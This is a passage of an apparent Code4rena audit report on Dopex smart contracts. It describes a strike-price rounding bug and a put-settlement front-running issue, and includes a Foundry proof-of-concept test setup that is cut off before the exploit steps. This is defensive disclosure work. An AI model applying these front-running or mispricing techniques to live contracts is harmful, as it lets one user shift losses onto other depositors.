class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bond</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxBondId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_whenNotPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Validate amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Compute the bond cost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Along with the collateral requirements, the <code>wethRequired</code> will also include the ETH premium required to mint the PUT option. The amount of premium is calculated based on a strike price which represents 75% of the current price of rDPX (25% OTM PUT option). In the <code>calculateBondCost</code> function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getRdpxPrice</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strike</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    .</span><span class=\"mtk11\">roundUp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">4</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// 25% below the current price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ).</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">putOptionsRequired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      .</span><span class=\"mtk11\">calculatePremium</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strike</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>As shown, the strike price is calculated as:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strike</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPerpetualAtlanticVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">roundUp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">rdpxPrice</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">4</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>It uses the <code>roundUp</code> function of the PerpetualAtlanticVault contract which is defined as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">roundUp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_strike</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strike</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remainder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_strike</span><span class=\"mtk1\"> % </span><span class=\"mtk12\">roundingPrecision</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">remainder</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_strike</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_strike</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">remainder</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">roundingPrecision</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>In this contract <code>roundingPrecision</code> is set to <code>1e6</code>, and this is where the problem arises. As I mentioned earlier, take the following approximate market prices: <code>$</code>2000/ETH and <code>$</code>20/rDPX. This means the <code>rdpxPrice</code>, which is represented as ETH/rDPX in 8 decimals of precision, will be <code>1e6</code>. To calculate the strike price, we get the following: <code>1e6 * 0.75 = 75e4</code>. However this value is fed into the <code>roundUp</code> function which will convert the <code>75e4</code> to <code>1e6</code>. This value of <code>1e6</code> is then used to calculate the premium, which is completely wrong. Not only is <code>1e6</code> not 25% OTM, but it is actually ITM, meaning the premium will be significantly higher than was intended by the protocol design.</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The value of the <code>roundingPrecision</code> is too high considering reasonable market prices of ETH and rDPX. Consider decreasing it.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2083#issuecomment-1734091528\">psytama (Dopex) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-02-put-settlement-can-be-anticipated-and-lead-to-user-losses-and-bonding-dos\" style=\"position:relative;\"><a href=\"#h-02-put-settlement-can-be-anticipated-and-lead-to-user-losses-and-bonding-dos\" aria-label=\"h 02 put settlement can be anticipated and lead to user losses and bonding dos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1584\">[H-02] Put settlement can be anticipated and lead to user losses and bonding DoS</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1584\">LokiThe5th</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1781\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/738\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/136\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2191\">Nikki</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1600\">mahdikarimi</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1814\">wintermute</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L278-L281\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L278-L281</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175</a></p>\n<p>The liquidity providers deposit <code>WETH</code> into the <code>PerpetualAtlanticVaultLP</code> which in turn provides the required collateral for put options writing. Writing puts locks collateral and to write more puts excess collateral is needed. Once a put is <em>in the money</em> it can be exercised by the <code>RdpxCoreV2</code> contract, which forces the liquidity providers to take on <code>rdpx</code> at above market prices (i.e. they take a loss).</p>\n<p>The issue is that liquidity providers to the <code>PerpetualAtlanticVaultLP</code> can anticipate when they might take losses. Users may then take the precautionary action to avoid losses by exiting the LP prior to put settlements. By doing this, the users who are not as fast, or as technically sophisticated, are forced to take on more losses (as losses are then spread among less LPs).</p>\n<p><strong>Importantly, this is not dependent on MEV and will also happen on chains where MEV is not possible.</strong></p>\n<p>This issue has two root causes:</p>\n<ol>\n<li>The price-threshold for settlement is known</li>\n<li><code>PerpetualAtlanticVaultLP</code> allows redemptions at any time as long as there is excess collateral available</li>\n</ol>\n<p><strong>This has a second order effect</strong>: by having the ability to anticipate when settlements will happen, if any puts are in the money, there is likely to be redemptions from the <code>PerpetualAtlanticVaultLP</code> which will drain all the available collateral. If all the available collateral is drained from the vault, then other users will not be able to bond using the <code>RdpxV2Core</code> contracts, as calls to <code>purchase</code> will <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L278-L281\">revert</a> due to insufficient collateral in the put options vault.</p>\n<p>The issue has been classified as high for the following reasons:</p>\n<ol>\n<li>The depositors who are either too slow, or are not as technically sophisticated, are forced to take more of the losses related to settlement of put options (as losses are spread among less participants).</li>\n<li>The token economic incentive is to anticipate calls to <code>settle</code> and avoid taking losses, and <code>deposit</code> again thereafter. This <em>will</em> create market-related periods of insufficient collateral, leading to regular (albeit temporary) DoS of the bonding mechanism which can impact the <code>ETH</code> peg of the <code>DpxEthToken</code> (not to mention the poor optics for the project).</li>\n</ol>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>As the price-threshold for settlement is known, depositors into the <code>PerpetualAtlanticVaultLP</code> have a few options to avoid this loss:</p>\n<ol>\n<li>Users can simply monitor the <code>rdpxPriceInEth</code> and, once the price is close to the strike price, remove their liquidity through <code>redeem()</code>. They can then deposit after settlement to take up a greater number of shares.</li>\n<li>Users can monitor the mempool (may be an issue in later versions of Arbitrum or other chains) for calls to <code>PerpetualAtlanticVault::settle()</code> and front-run this with a call to <code>redeem</code> to avoid losses.</li>\n<li>As <code>settle()</code> is a manual call from the Dopex multisig, this may take the form of a weekly process. Users may come to anticipate this and pull the available assets from the LP at those regular intervals.</li>\n</ol>\n<p>Regardless of the method, the end result is the same.</p>\n<p>The below coded PoC demonstrates the issue. One of the users, Bob (<code>address(1)</code>), anticipates a call to <code>settle()</code> - either through front-running or a market-related decision. Bob then enters and exits the pool right before and after the <code>settle</code> call. Dave (<code>address(2)</code>), who is another liquidity provider, does not anticipate the <code>settle()</code> call. We note the differences in PnL this creates in the console output.</p>\n<p>Note: The PoC was created using the <code>perp-vault/Integration.t.sol</code> file, and should be placed in the <code>tests/perp-vault</code> directory in a <code>.sol</code> file. The PoC can then be run with <code>forge test --match-test testPoCHigh3 -vvv</code></p>\n<p>Apologies for the extended setup code at the start, this is needed for an accurate test, the PoC start point is marked clearly.</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: UNLICENSED</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.19;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Test } from &quot;forge-std/Test.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;forge-std/console.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { ERC721Holder } from &quot;@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Setup } from &quot;./Setup.t.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { PerpetualAtlanticVault } from &quot;contracts/perp-vault/PerpetualAtlanticVault.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract PoC is ERC721Holder, Setup {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // ================================ HELPERS ================================ //</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function mintWeth(uint256 _amount, address _to) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    weth.mint(_to, _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function mintRdpx(uint256 _amount, address _to) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    rdpx.mint(_to, _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function deposit(uint256 _amount, address _from) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(_from, _from);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vaultLp.deposit(_amount, _from);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function purchase(uint256 _amount, address _as) public returns (uint256 id) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(_as, _as);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (, id) = vault.purchase(_amount, _as);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function setApprovals(address _as) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(_as, _as);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    rdpx.approve(address(vault), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    rdpx.approve(address(vaultLp), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    weth.approve(address(vault), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    weth.approve(address(vaultLp), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // ================================ CORE ================================ //</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Assumptions &amp; config:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - address(this) is impersonating the rdpxV2Core contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - premium per option: 0.05 weth</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - epoch duration: 1 day; 86400 seconds</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - initial price of rdpx: 0.2 weth</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - pricing precision is in 0.1 gwei</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - premium precision is in 0.1 gwei</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - rdpx and weth denomination in wei</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  **/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function testPoCHigh3() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Setup starts here -----------------------------&gt;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    setApprovals(address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    setApprovals(address(2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    setApprovals(address(3));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mintWeth(5 ether, address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mintWeth(5 ether, address(2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mintWeth(25 ether, address(3));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// The users deposit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    deposit(5 ether, address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    deposit(5 ether, address(2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    deposit(25 ether, address(3));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 userBalance = vaultLp.balanceOf(address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(userBalance, 5 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    userBalance = vaultLp.balanceOf(address(2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(userBalance, 5 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    userBalance = vaultLp.balanceOf(address(3));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(userBalance, 25 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // premium = 100 * 0.05 weth = 5 weth</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 tokenId = purchase(100 ether, address(this)); // 0.015 gwei * 100 ether / 0.1 gwei = 15 ether collateral activated</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    skip(86500); // expires epoch 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vault.updateFunding();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vault.updateFundingPaymentPointer();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] memory strikes = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    strikes[0] = 0.015 gwei;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 fundingAccrued = vault.calculateFunding(strikes);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(fundingAccrued, 5 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] memory tokenIds = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tokenIds[0] = tokenId;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// ---------------- POC STARTS HERE ---------------------------------------------------///</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> 